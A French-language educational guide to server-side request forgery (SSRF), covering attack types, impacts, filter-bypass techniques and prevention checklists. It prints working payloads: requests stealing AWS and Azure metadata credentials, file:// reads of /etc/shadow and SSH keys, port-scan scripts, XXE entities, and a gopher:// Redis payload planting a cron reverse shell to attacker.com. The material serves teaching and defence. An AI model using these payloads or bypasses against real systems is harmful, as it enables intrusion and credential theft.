# Falsification de Requête Côté Serveur (SSRF) - Ressources

## Table des matières
1. [Qu'est-ce que la SSRF ?](#quest-ce-que-la-ssrf)
2. [Comment fonctionne la SSRF ?](#comment-fonctionne-la-ssrf)
3. [Types d'attaques SSRF](#types-dattaques-ssrf)
4. [Impact et risques](#impact-et-risques)
5. [Scénarios d'attaque courants](#scénarios-dattaque-courants)
6. [Protection et prévention](#protection-et-prévention)
7. [Références et lectures complémentaires](#références-et-lectures-complémentaires)

---

## Qu'est-ce que la SSRF ?

**La Falsification de Requête Côté Serveur (Server-Side Request Forgery, SSRF)** est une vulnérabilité de sécurité web critique qui permet à un attaquant de forcer une application côté serveur à effectuer des requêtes HTTP vers des emplacements non prévus au nom du serveur. Récemment ajoutée au Top 10 de la sécurité des API de l'OWASP, la SSRF exploite la relation de confiance entre le serveur vulnérable et les ressources internes.

### Caractéristiques clés :
- **Cause première** : Manque de validation et de nettoyage appropriés des données fournies par l'utilisateur, en particulier les URL
- **Vecteur d'attaque** : Manipulation des requêtes côté serveur pour accéder à des ressources non autorisées
- **Exploitation de la confiance** : Tire parti de la position privilégiée du serveur au sein des réseaux internes

### SSRF vs CSRF

Bien que leurs acronymes soient similaires, ces attaques sont distinctes :

| Aspect | SSRF (Côté Serveur) | CSRF (Côté Client) |
|--------|---------------------|---------------------|
| **Cible** | Le serveur effectue des requêtes non intentionnelles | Le navigateur de l'utilisateur effectue des requêtes non intentionnelles |
| **L'attaquant force** | Le serveur à agir | Le navigateur de l'utilisateur authentifié à agir |
| **Accès à** | Ressources du réseau interne | Privilèges de session de l'utilisateur |
| **Responsabilité de prévention** | Développeurs backend | Développeurs frontend |
| **Cible typique** | Services internes, métadonnées cloud | Points d'accès d'application authentifiés |

---

## Comment fonctionne la SSRF ?

### Flux normal :
```
Client → Requête → Serveur → Réponse → Client
```

### Flux d'attaque SSRF :
```
Attaquant → Requête malveillante → Serveur vulnérable → Ressource interne
                                            ↓
                                    Réponse (fuite de données potentielle)
```

### Mécanisme d'attaque :

1. **L'attaquant identifie un point d'accès vulnérable** qui accepte des URL fournies par l'utilisateur
2. **Fabrique une charge utile malveillante** ciblant des ressources internes
3. **Le serveur traite la requête** sans validation appropriée
4. **Le serveur effectue la requête** vers la destination contrôlée par l'attaquant
5. **La réponse est retournée** à l'attaquant (ou traitée côté serveur)

### Exemple d'attaque :

**Code vulnérable (Python/Flask) :**
```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')  # ❌ Aucune validation !
    response = requests.get(url)    # ❌ Dangereux !
    return response.text            # ❌ Fuite de la réponse !
```

**Exploitation :**
```bash
# Accès au panneau d'administration interne
GET /fetch?url=http://127.0.0.1/admin

# Accès au service de métadonnées AWS
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Lecture de fichiers locaux (si file:// est activé)
GET /fetch?url=file:///etc/passwd
```

---

## Types d'attaques SSRF

### 1. SSRF Classique (Regular SSRF)

**Caractéristiques :**
- L'application renvoie la réponse backend directement à l'attaquant
- La plus facile à exploiter (retour immédiat)
- Risque de divulgation d'informations le plus élevé

**Exemple :**
```http
GET /api/fetch?url=http://internal-api.local/users HTTP/1.1
Host: vulnerable-app.com

HTTP/1.1 200 OK
Content-Type: application/json

{"users": [{"id": 1, "email": "admin@internal.local", "password_hash": "..."}]}
```

### 2. SSRF Aveugle (Blind SSRF)

**Caractéristiques :**
- Le serveur exécute la requête mais ne renvoie pas la réponse
- Nécessite des techniques out-of-band pour confirmer l'exploitation
- Plus difficile mais toujours dangereux

**Techniques de détection :**
- **Surveillance DNS/HTTP** : Utiliser Burp Collaborator, Interactsh, ou un serveur personnalisé
- **Inférence temporelle** : Mesurer les temps de réponse pour différentes cibles

**Exemple :**
```bash
# Requête vers un serveur contrôlé par l'attaquant
GET /webhook/test?url=http://attacker.burpcollaborator.net

# L'attaquant reçoit une requête HTTP/DNS sur son serveur, confirmant la SSRF
```

### 3. SSRF Partiellement Aveugle (Partially-Blind SSRF)

**Caractéristiques :**
- Aucun contenu de réponse directement retourné
- L'attaquant peut déduire des informations à partir d'indicateurs de canal auxiliaire
- Les variations de temps de réponse, codes de statut ou Content-Length révèlent des informations

**Indicateurs de canal auxiliaire :**
- **Code de statut HTTP** : `200 OK` vs `404 Not Found` vs `Connection Timeout`
- **Temps de réponse** : Un port ouvert répond rapidement, un port fermé expire
- **Content-Length** : `0` octets vs `1234` octets indiquent des réponses différentes

**Exemple (Scan de ports) :**
```python
import requests
import time

def scan_port(port):
    start = time.time()
    try:
        requests.get(f'http://vulnerable-app.com/fetch?url=http://127.0.0.1:{port}', timeout=2)
        elapsed = time.time() - start
        if elapsed < 1:
            print(f"Port {port}: OUVERT (réponse rapide)")
        else:
            print(f"Port {port}: FILTRÉ (réponse lente)")
    except:
        print(f"Port {port}: FERMÉ (timeout)")

for port in [22, 80, 443, 3306, 6379, 8080]:
    scan_port(port)
```

---

## Impact et risques

### 1. Accès aux systèmes internes

**Risque** : Atteindre des services backend non exposés sur Internet

**Exemples :**
- Points d'accès API internes (`http://internal-api.local/admin`)
- Panneaux d'administration de bases de données (phpMyAdmin, pgAdmin)
- Tableaux de bord internes (Grafana, Kibana)
- Files de messages (RabbitMQ, Kafka)
- Serveurs de cache (Redis, Memcached)

**Impact** : Compromission complète de l'infrastructure backend

### 2. Contournement du contrôle d'accès

**Risque** : Exploiter les hypothèses de confiance localhost

De nombreuses applications accordent un accès privilégié aux requêtes provenant de `localhost` :

```python
# Vérification admin vulnérable
def is_admin():
    if request.remote_addr == '127.0.0.1':
        return True  # ❌ Fait confiance à localhost inconditionnellement
    return check_user_role()

# L'attaquant exploite via SSRF pour accéder au panneau admin
GET /fetch?url=http://127.0.0.1/admin/delete-user?id=1
```

### 3. Exfiltration de données sensibles

**Risque** : Voler des identifiants, des jetons et des données de configuration

#### Services de métadonnées cloud

Tous les principaux fournisseurs de cloud exposent des services de métadonnées sur des IP internes :

| Fournisseur | IP de métadonnées | Exemple de point d'accès |
|-------------|-------------------|--------------------------|
| **AWS** | `169.254.169.254` | `/latest/meta-data/iam/security-credentials/` |
| **Azure** | `169.254.169.254` | `/metadata/identity/oauth2/token` |
| **GCP** | `metadata.google.internal` (169.254.169.254) | `/computeMetadata/v1/instance/service-accounts/default/token` |
| **Digital Ocean** | `169.254.169.254` | `/metadata/v1/` |
| **Oracle Cloud** | `192.0.0.192` | `/opc/v1/instance/` |
| **Alibaba Cloud** | `100.100.100.200` | `/latest/meta-data/` |

**Exemple AWS :**
```bash
# Étape 1 : Lister les rôles IAM disponibles
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Réponse : AdminRole

# Étape 2 : Récupérer les identifiants pour AdminRole
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# Réponse (JSON) :
{
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...<token>...r6Ft",
  "Expiration": "2025-12-09T12:34:56Z"
}

# Étape 3 : Utiliser les identifiants pour accéder aux ressources AWS
aws s3 ls --profile stolen-creds
```

**Azure IMDSv2 (avec exigence d'en-tête) :**
```bash
# Azure nécessite un en-tête spécifique, mais SSRF peut toujours l'exploiter
# si l'application permet l'injection d'en-têtes ou utilise un client vulnérable

# Obtenir un jeton d'accès
GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
X-Metadata: true
```

### 4. Exécution de code à distance (RCE)

**Risque** : Chaîner SSRF avec d'autres vulnérabilités pour exécuter du code

#### Exemple : Exploitation Redis via SSRF + Protocole Gopher

```bash
# Redis s'exécute sur localhost:6379 sans authentification
# Utiliser gopher:// pour envoyer des commandes Redis

# Charge utile pour écrire un cron job (exécute un reverse shell)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

# Charge utile gopher encodée en URL cible Redis pour écrire un cron job malveillant
GET /fetch?url=gopher://...
```

### 5. Déni de service (DoS)

**Risque** : Épuiser les ressources du serveur ou attaquer des systèmes internes

**Scénarios :**
- **Épuisement des ressources** : Demander de gros fichiers pour remplir le disque/la mémoire
- **Boucles infinies** : Amener le serveur à se demander lui-même de manière récursive
- **DoS interne** : Inonder les services internes de requêtes

**Exemple :**
```bash
# Demander un fichier de 10 Go pour épuiser la mémoire
GET /fetch?url=http://attacker.com/10gb-file.bin

# Auto-requête récursive (DoS d'application)
GET /fetch?url=http://vulnerable-app.com/fetch?url=http://vulnerable-app.com/fetch?url=...
```

### 6. Chaînage d'attaques et pivotement

**Risque** : Utiliser le serveur compromis comme proxy d'attaque contre des tiers

**Scénario** : Le serveur vulnérable devient un proxy d'attaque involontaire :
```
Attaquant → Serveur vulnérable → Victime tierce
```

**Conséquences :**
- L'organisation apparaît comme la source de l'attaque
- Problèmes de responsabilité légale
- Dommages à la réputation IP
- Falsification des logs (les attaques semblent provenir d'un serveur légitime)

---

## Scénarios d'attaque courants

### 1. Identification de la surface d'attaque

#### Paramètres vulnérables courants

Les recherches de Jason Haddix et d'autres ont identifié des noms de paramètres fréquemment vulnérables :

| Noms courants | | | | |
|---------------|---|---|---|---|
| `dest` | `redirect` | `uri` | `path` | `continue` |
| `url` | `window` | `next` | `data` | `reference` |
| `site` | `html` | `val` | `validate` | `domain` |
| `callback` | `return` | `page` | `feed` | `host` |
| `port` | `to` | `out` | `view` | `dir` |
| `show` | `navigation` | `open` | | |

#### Catégories de fonctionnalités sujettes à SSRF

**1. Webhooks / Tests de webhooks**
```http
POST /api/webhooks HTTP/1.1
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/",
  "events": ["user.created"]
}

# Beaucoup d'applications ont une fonctionnalité "Tester le Webhook"
POST /api/webhooks/test
{
  "url": "http://internal-admin.local/delete-all-data"
}
```

**2. Import de fichier depuis URL**
```http
POST /api/documents/import HTTP/1.1

{
  "file_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# Également courant dans :
# - Upload d'image depuis URL
# - Import d'avatar depuis URL
# - Convertisseur de documents (PDF, DOCX, etc.)
# - Lecteur de flux RSS/Atom
```

**3. Générateurs de PDF**

De nombreuses bibliothèques de génération PDF exécutent JavaScript ou chargent des ressources externes :

```html
<!-- HTML envoyé au générateur PDF -->
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>

<script>
  // Requête XHR exécutée côté serveur pendant le rendu PDF
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://internal-api.local/admin/users', false);
  xhr.send();
  document.write(xhr.responseText);
</script>

<!-- @import CSS peut aussi déclencher SSRF dans certains moteurs de rendu -->
<style>
  @import url('http://169.254.169.254/latest/meta-data/');
</style>
```

**4. Analytique de l'en-tête Referer**

Certains outils d'analyse visitent les URL dans l'en-tête `Referer` :

```http
GET /page.html HTTP/1.1
Host: vulnerable-app.com
Referer: http://169.254.169.254/latest/meta-data/

# L'analytique côté serveur visite l'URL Referer → SSRF
```

**5. XML External Entity (XXE) → SSRF**

Les parseurs XML peuvent récupérer des entités externes :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>

<!-- Le serveur parse le XML et récupère l'URL de l'entité → SSRF -->
```

### 2. Techniques d'exploitation

#### Scan de ports (Cross-Site Port Attack)

**Objectif** : Cartographier la topologie du réseau interne

```python
# Scanner les ports courants sur le réseau interne
import requests

targets = [
    ("127.0.0.1", [22, 80, 443, 3306, 5432, 6379, 8080, 27017]),
    ("192.168.1.1", [80, 443, 8080]),
    ("10.0.0.1", [22, 3389, 8080])
]

for ip, ports in targets:
    for port in ports:
        url = f"http://vulnerable-app.com/fetch?url=http://{ip}:{port}"
        try:
            resp = requests.get(url, timeout=2)
            if resp.status_code != 500:  # Pas d'erreur de connexion
                print(f"✅ {ip}:{port} OUVERT")
        except:
            print(f"❌ {ip}:{port} FERMÉ")
```

#### Lecture de fichiers locaux

**Objectif** : Lire des fichiers sensibles du système de fichiers du serveur

```bash
# Cibles Linux
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///var/log/apache2/access.log
file:///home/user/.ssh/id_rsa

# Cibles Windows
file://C:/Windows/System32/drivers/etc/hosts
file://C:/boot.ini
file://C:/inetpub/wwwroot/web.config
file://C:/Users/Administrator/.ssh/id_rsa
```

**Exemple :**
```http
GET /fetch?url=file:///etc/passwd HTTP/1.1
Host: vulnerable-app.com

HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

#### Interaction avec les services internes

**Redis (Port 6379) :**
```bash
# Utilisation du protocole dict:// (plus simple que gopher)
dict://127.0.0.1:6379/INFO

# Utilisation de gopher:// pour des commandes complexes
gopher://127.0.0.1:6379/_SET%20ssrf%20test
```

**Memcached (Port 11211) :**
```bash
# Récupérer les données en cache
gopher://127.0.0.1:11211/_stats

# Obtenir une clé spécifique
gopher://127.0.0.1:11211/_get%20session:admin
```

**MySQL (Port 3306) :**
```bash
# Tentative de connexion (peut révéler la version dans l'erreur)
gopher://127.0.0.1:3306/...
```

**SMTP (Port 25) :**
```bash
# Envoyer un email depuis le serveur mail interne
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com
```

---

## Protection et prévention

### Stratégie de défense : Listes blanches (Recommandé)

**Principe** : Autoriser uniquement les destinations explicitement approuvées.

#### 1. Liste blanche des domaines/IP autorisés

```python
# ✅ SÉCURISÉ : Liste blanche stricte
ALLOWED_DOMAINS = [
    'api.example.com',
    'cdn.example.com',
    'webhook-provider.com'
]

def fetch_url(url):
    parsed = urlparse(url)

    # Vérifier le domaine
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domaine non autorisé")

    # Vérifier le schéma
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Protocole invalide")

    # Vérifier le port (si spécifié)
    if parsed.port and parsed.port not in [80, 443]:
        raise ValueError("Port invalide")

    # Désactiver les redirections
    response = requests.get(url, allow_redirects=False, timeout=5)
    return response
```

#### 2. Restrictions au niveau réseau

**Règles de pare-feu cloud :**
```bash
# Groupe de sécurité AWS : Bloquer le service de métadonnées depuis les serveurs app
aws ec2 authorize-security-group-egress \
  --group-id sg-xxxxx \
  --ip-permissions IpProtocol=tcp,FromPort=80,ToPort=80,IpRanges='[{CidrIp=169.254.169.254/32}]' \
  --revoke

# Bloquer les plages IP privées RFC 1918
# 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
```

**IMDSv2 (Service de métadonnées AWS v2) :**
```bash
# Exiger un jeton de session (empêche SSRF)
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxx \
  --http-tokens required \
  --http-endpoint enabled
```

#### 3. Filtrage des réponses

```python
# ✅ SÉCURISÉ : Ne jamais retourner la réponse brute
def fetch_and_parse_json(url):
    if not is_allowed_domain(url):
        raise ValueError("Domaine non autorisé")

    response = requests.get(url, timeout=5, allow_redirects=False)

    # Retourner uniquement le format de données attendu
    try:
        data = response.json()
        # Valider contre le schéma attendu
        if not validate_schema(data):
            raise ValueError("Format de réponse invalide")
        return {
            'status': 'success',
            'items': data.get('items', [])  # Retourner uniquement des champs spécifiques
        }
    except:
        return {'status': 'error', 'message': 'Réponse invalide'}
```

### Pourquoi les listes noires échouent

**❌ INEFFICACE : Approche par liste noire**

```python
# ❌ Facilement contournable
BLOCKED_IPS = ['127.0.0.1', '169.254.169.254', 'localhost']

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.hostname in BLOCKED_IPS:
        return False
    return True

# Contournements :
# - 127.0.0.1 → 0x7f000001 (hex)
# - 127.0.0.1 → 2130706433 (entier)
# - 127.0.0.1 → 127.1 (notation abrégée octale)
# - localhost → localtest.me (résout vers 127.0.0.1)
# - 169.254.169.254 → metadata.google.internal
```

### Techniques de contournement (Connais ton ennemi)

#### 1. Schémas d'URL exotiques

```bash
# Bloquer http/https mais oublier d'autres schémas
file:///etc/passwd
ftp://internal-ftp.local/backup.zip
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/INFO
ldap://internal-ldap.local/dc=company,dc=com
tftp://192.168.1.100/config.bin
```

#### 2. Obfuscation d'adresse IP

**Cible : `127.0.0.1`**
```bash
# Hexadécimal
http://0x7f000001/
http://0x7f.0x00.0x00.0x01/

# Entier (décimal)
http://2130706433/

# Octal
http://0177.0.0.1/
http://017700000001/

# Formats mixtes
http://127.0.0.1/        # Décimal
http://0x7f.0.0.1/       # Mixte hex/décimal
http://127.1/            # Notation abrégée (omettre les zéros)

# IPv6
http://[::1]/            # IPv6 localhost
http://[::ffff:7f00:1]/  # IPv4 mappé en IPv6
```

**Cible : `169.254.169.254` (Métadonnées AWS)**
```bash
# Hexadécimal
http://0xa9fea9fe/

# Entier
http://2852039166/

# Octal
http://0251.0376.0251.0376/
```

#### 3. Astuces de résolution DNS

```bash
# Services qui résolvent vers 127.0.0.1
http://localtest.me/
http://vcap.me/
http://127.0.0.1.nip.io/
http://7f000001.nip.io/     # Encodage hex + nip.io

# DNS malveillant personnalisé
http://internal-service.attacker.com/  # Résout vers 10.0.0.5

# Spécifique au cloud
http://metadata.google.internal/  # Métadonnées GCP (résout vers 169.254.169.254)
```

#### 4. Confusion du parseur d'URL

**Exploitation du caractère @ :**
```bash
# Format URL : protocol://[user[:password]@]hostname[:port]/path

# Ce que l'application voit (après parsing)
http://allowed-domain.com@evil.com/
#       ^^^^^^^^^^^^^^^^^^  ^^^^^^^^
#       User/pass (ignoré)  Hôte réel

# Ce que voit le filtre (correspondance de chaîne naïve)
http://allowed-domain.com@evil.com/
#       ^^^^^^^^^^^^^^^^^^
#       "Contient domaine autorisé" → PASS

# La vraie requête va vers : evil.com
```

**Exploitation du caractère # Fragment :**
```bash
# Format URL : protocol://hostname/path#fragment

http://evil.com#allowed-domain.com
#       ^^^^^^^  ^^^^^^^^^^^^^^^^^^
#       Hôte     Fragment (ignoré par le client HTTP)

# Le filtre naïf vérifie : "Contient allowed-domain.com" → PASS
# La vraie requête va vers : evil.com (le fragment est côté client uniquement)
```

**Astuces d'encodage d'URL :**
```bash
# Double encodage
http://127.0.0.1/ → http://%31%32%37%2e%30%2e%30%2e%31/

# Unicode/Punycode (attaque d'homographe IDN)
http://xn--lhq98g.com/  # Caractères chinois qui ressemblent à "localhost"
```

#### 5. Chaînage avec redirection ouverte

**Scénario** : Un domaine autorisé a une vulnérabilité de redirection ouverte

```bash
# Étape 1 : Identifier le domaine autorisé
AUTORISÉ : https://trusted-partner.com

# Étape 2 : Trouver une redirection ouverte sur le domaine de confiance
https://trusted-partner.com/redirect?url=http://evil.com

# Étape 3 : Chaîner SSRF + Redirection ouverte
GET /fetch?url=https://trusted-partner.com/redirect?url=http://169.254.169.254/latest/meta-data/

# Flux :
# 1. Le filtre SSRF voit "trusted-partner.com" → AUTORISÉ ✅
# 2. Le serveur demande : trusted-partner.com/redirect?url=...
# 3. Le serveur de confiance répond : HTTP 302 → Location: http://169.254.169.254/...
# 4. Le serveur vulnérable suit la redirection
# 5. Récupère les métadonnées AWS ❌
```

**Mitigation** : Désactiver les redirections HTTP dans le client HTTP :
```python
requests.get(url, allow_redirects=False)  # Python
axios.get(url, { maxRedirects: 0 })       // Node.js
curl --max-redirs 0 $URL                  # cURL
```

---

## Checklist de prévention

### Niveau application

- [ ] **Implémenter des listes blanches strictes** pour les domaines, IP, ports et schémas
- [ ] **Valider le format d'URL** en utilisant une bibliothèque de parsing robuste
- [ ] **Désactiver les redirections HTTP** dans la bibliothèque client HTTP
- [ ] **Filtrer les données de réponse** - ne jamais retourner les réponses backend brutes
- [ ] **Rejeter les plages IP privées** (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- [ ] **Bloquer localhost** (127.0.0.0/8, ::1, alias localhost)
- [ ] **Bloquer les IP de métadonnées cloud** (169.254.169.254, 192.0.0.192, 100.100.100.200)
- [ ] **Désactiver les schémas d'URL dangereux** (file://, gopher://, dict://, etc.)
- [ ] **Implémenter des timeouts de requête** (éviter l'épuisement des ressources)
- [ ] **Logger toutes les requêtes sortantes** pour surveillance de sécurité
- [ ] **Utiliser des comptes de service dédiés** avec permissions minimales
- [ ] **Valider le Content-Type** des réponses
- [ ] **Implémenter une limitation de débit** sur les points d'accès récupérant des URL

### Niveau réseau

- [ ] **Segmenter les réseaux internes** (séparer serveurs app des services sensibles)
- [ ] **Configurer les règles de pare-feu sortant** pour bloquer les adresses RFC 1918
- [ ] **Utiliser AWS IMDSv2** ou équivalent (nécessite un jeton de session)
- [ ] **Déployer des règles WAF** pour détecter les patterns SSRF
- [ ] **Surveiller les requêtes DNS** pour résolution interne suspecte
- [ ] **Implémenter des ACL réseau** pour restreindre l'accès des serveurs app
- [ ] **Utiliser des VPC endpoints** au lieu d'IP publiques pour services cloud
- [ ] **Désactiver IPv6** si non nécessaire (réduit la surface d'attaque)

### Checklist de revue de code

Recherchez ces patterns vulnérables :

```python
# ❌ PATTERNS DANGEREUX

# 1. Utilisation directe d'URL depuis l'entrée utilisateur
url = request.args.get('url')
response = requests.get(url)  # Aucune validation !

# 2. Webhook sans validation
webhook_url = data['webhook_url']
requests.post(webhook_url, json=payload)  # Dangereux !

# 3. Import d'image/fichier depuis URL
file_url = request.form['file_url']
download_file(file_url)  # Aucune vérification !

# 4. Génération PDF avec HTML utilisateur
html = request.form['html']
generate_pdf(html)  # Peut contenir <iframe> ou XHR !

# 5. Parsing XML sans protection XXE
xml_data = request.data
parsed = ET.fromstring(xml_data)  # Vulnérable à XXE → SSRF !
```

---

## Références et lectures complémentaires

### Documentation officielle

- **OWASP SSRF** : https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- **PortSwigger Web Security Academy** : https://portswigger.net/web-security/ssrf
- **CWE-918: Server-Side Request Forgery** : https://cwe.mitre.org/data/definitions/918.html
- **Sécurité AWS IMDSv2** : https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html

### Articles et recherches

- **"A New Era of SSRF" par Orange Tsai** : https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- **"SSRF Bible" par Wallarm** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- **"Exploiting SSRF in AWS EC2" par Brett Buerhaus** : https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed

### Outils

- **Burp Suite Collaborator** : Test d'interaction out-of-band
- **Interactsh** : Serveur d'interaction OOB open-source
- **SSRFmap** : Outil d'exploitation SSRF automatique
- **Gopherus** : Générer des charges utiles gopher:// pour divers services

### Applications vulnérables (Pratique)

- **DVWA (Damn Vulnerable Web Application)** : https://github.com/digininja/DVWA
- **bWAPP** : http://www.itsecgames.com/
- **OWASP WebGoat** : https://owasp.org/www-project-webgoat/
- **SSRF Proxy Lab** : https://portswigger.net/web-security/ssrf/lab

### Guides de sécurité des fournisseurs cloud

- **AWS** : https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- **Azure** : https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
- **GCP** : https://cloud.google.com/compute/docs/metadata/overview

---

## Résumé

### Points clés à retenir

1. **La SSRF exploite la confiance du serveur** pour accéder aux ressources internes
2. **Les listes blanches sont la seule défense efficace** - les listes noires échouent
3. **Désactiver les redirections HTTP** pour empêcher le chaînage avec redirection ouverte
4. **Ne jamais faire confiance aux entrées utilisateur** - valider toutes les URL rigoureusement
5. **Les services de métadonnées cloud** sont des cibles SSRF de grande valeur
6. **Défense en profondeur** : Combiner contrôles application, réseau et cloud
7. **Tester vos défenses** contre les techniques de contournement connues

### Référence rapide : Attaque vs Défense

| Technique d'attaque | Stratégie de défense |
|---------------------|----------------------|
| Accès `127.0.0.1` | Bloquer localhost + toutes représentations (hex, octal, entier) |
| Accès `169.254.169.254` | Utiliser IMDSv2, bloquer IP métadonnées, VPC endpoints |
| Utiliser schéma `file://` | Autoriser uniquement `http://` et `https://` |
| Utiliser `gopher://` pour Redis | Bloquer tous les schémas non-HTTP/HTTPS |
| Encodage IP (hex/octal) | Parser URL, valider IP résolue contre liste blanche |
| Astuces DNS (`nip.io`) | Valider IP résolue, pas seulement le nom d'hôte |
| Chaînage redirection ouverte | Désactiver redirections HTTP (`allow_redirects=False`) |
| Fuite de données de réponse | Filtrer réponses, retourner uniquement format de données attendu |

---

**Version du document** : 1.0
**Dernière mise à jour** : 9 décembre 2025
**Auteur** : Équipe Sécurité
**Licence** : Usage éducatif uniquement
